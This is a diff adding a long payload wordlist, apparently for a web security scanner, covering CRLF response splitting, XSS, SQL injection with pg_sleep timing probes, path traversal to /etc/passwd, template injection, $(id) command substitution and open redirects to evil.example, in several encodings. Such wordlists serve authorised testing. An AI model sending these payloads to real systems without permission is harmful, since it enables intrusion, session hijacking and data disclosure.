@@ -78,3 +78,165 @@ responsesplit_1
 %0d%0aX-Test:%20injected&v=2
 %250d%250aX-Test%3A%2520injected_2
 responsesplit_2
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%250d%250aContent-Type%3A%20text%2Fhtml%250d%250a%250d%250a%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%25250d%25250aContent-Type%253A%2520text%252Fhtml%25250d%25250a%25250d%25250a%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+%0d%0aContent-Type:/**/text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0D%0ACONTENT-TYPE: TEXT/HTML%0D%0A%0D%0A<SCRIPT>ALERT(1)</SCRIPT>
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>?aurose=1
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>&aurose=1
+%0d%0aSet-Cookie: split=1
+%250d%250aSet-Cookie%3A%20split%3D1
+%25250d%25250aSet-Cookie%253A%2520split%253D1
+%0d%0aSet-Cookie:/**/split=1
+%0d%0aSet-Cookie: split%3d1
+%0D%0ASET-COOKIE: SPLIT=1
+%0d%0aSet-Cookie: split=1?aurose=1
+%0d%0aSet-Cookie: split=1&aurose=1
+%0d%0aLocation: //evil.example
+%250d%250aLocation%3A%20%2F%2Fevil.example
+%25250d%25250aLocation%253A%2520%252F%252Fevil.example
+%0d%0aLocation:/**///evil.example
+%0D%0ALOCATION: //EVIL.EXAMPLE
+%0d%0aLocation: //evil.example?aurose=1
+%0d%0aLocation: //evil.example&aurose=1
+%0d%0aX-Split: yes
+%250d%250aX-Split%3A%20yes
+%25250d%25250aX-Split%253A%2520yes
+%0d%0aX-Split:/**/yes
+%0D%0AX-SPLIT: YES
+%0d%0aX-Split: yes?aurose=1
+%0d%0aX-Split: yes&aurose=1
+INJECTED
+%0D%0A%0D%0AINJECTED
+%250D%250A%250D%250AINJECTED
+INJECTED?aurose=1
+INJECTED&aurose=1
+%0d%0aCache-Control: no-store
+%250d%250aCache-Control%3A%20no-store
+%25250d%25250aCache-Control%253A%2520no-store
+%0d%0aCache-Control:/**/no-store
+%0D%0ACACHE-CONTROL: NO-STORE
+%0d%0aCache-Control: no-store?aurose=1
+%0d%0aCache-Control: no-store&aurose=1
+%0d%0aConnection: close
+%250d%250aConnection%3A%20close
+%25250d%25250aConnection%253A%2520close
+%0d%0aConnection:/**/close
+%0D%0ACONNECTION: CLOSE
+%0d%0aConnection: close?aurose=1
+%0d%0aConnection: close&aurose=1
+%0d%0aRefresh:0;url=https://evil.example
+%250d%250aRefresh%3A0%3Burl%3Dhttps%3A%2F%2Fevil.example
+%25250d%25250aRefresh%253A0%253Burl%253Dhttps%253A%252F%252Fevil.example
+%0d%0aRefresh:0;url%3dhttps://evil.example
+%0D%0AREFRESH:0;URL=HTTPS://EVIL.EXAMPLE
+%0d%0aRefresh:0;url=https://evil.example?aurose=1
+%0d%0aRefresh:0;url=https://evil.example&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>::var0
+%250d%250aContent-Type%3A%20text%2Fhtml%250d%250a%250d%250a%3Cscript%3Ealert%281%29%3C%2Fscript%3E::v0
+/responsesplit/probe/0
+%0d%0aSet-Cookie: split=1::var1
+%250d%250aSet-Cookie%3A%20split%3D1::v1
+/responsesplit/probe/1
+%0d%0aLocation: //evil.example::var2
+%250d%250aLocation%3A%20%2F%2Fevil.example::v2
+/responsesplit/probe/2
+%0d%0aX-Split: yes::var3
+%250d%250aX-Split%3A%20yes::v3
+/responsesplit/probe/3
+INJECTED::var4
+%0D%0A%0D%0AINJECTED::v4
+/responsesplit/probe/4
+%0d%0aCache-Control: no-store::var5
+%250d%250aCache-Control%3A%20no-store::v5
+/responsesplit/probe/5
+%0d%0aConnection: close::var6
+%250d%250aConnection%3A%20close::v6
+/responsesplit/probe/6
+%0d%0aRefresh:0;url=https://evil.example::var7
+%250d%250aRefresh%3A0%3Burl%3Dhttps%3A%2F%2Fevil.example::v7
+/responsesplit/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/responsesplit/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/responsesplit/probe/9
